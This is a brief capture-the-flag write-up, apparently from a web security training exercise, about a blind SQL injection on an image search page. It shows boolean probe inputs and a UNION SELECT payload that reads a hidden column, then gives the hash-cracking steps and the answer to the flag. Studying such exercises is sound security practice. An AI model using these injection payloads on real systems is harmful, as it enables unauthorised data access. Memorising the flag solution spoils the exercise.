On: ```/index.php?page=searchimg```

### Flaw
You can see that the query is vulnerable just by trying ```1 or 1=1``` and then ```1 and 1=2```

The first time you get a result and the second time just nothing.
This can have the same outcome than a regular SQLi flaw but is more difficult to exploit.

### Flag
- From the first SQL Injection flaw we know that the table ```list_images``` contains a ```comment``` column
- To display it: 1 UNION SELECT title, comment FROM list_images
- ```If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46```
- ```albatroz```
- Finally sha256 on it to get the flag
